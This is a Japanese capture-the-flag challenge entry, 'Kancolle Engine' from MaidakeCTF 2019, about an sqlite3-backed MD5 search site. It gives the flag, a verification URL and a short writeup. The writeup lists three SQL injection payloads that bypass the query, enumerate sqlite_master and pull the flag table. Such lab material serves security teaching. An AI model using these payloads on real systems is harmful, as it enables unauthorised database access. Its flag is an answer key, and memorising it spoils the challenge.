# Kancolle Engine

## 問題文
艦娘のMD5を検索できるサイトを作ってみました！
※sqlite3を使用しています。

## 添付ファイル
URL

## Flag
MaidakeCTF{Use_question_mark_placeholders_when_calling_SQL}

## 検証用URL
https://aokakes.work/CTF/MaidakeCTF2019/Kancolle_Engine/

## writeup
+ 1' or 1 = 1 -- 
+ 1' UNION SELECT name, sql FROM sqlite_master WHERE type='table' ORDER BY name -- 
+ 1' UNION SELECT flag,0 FROM flag -- 
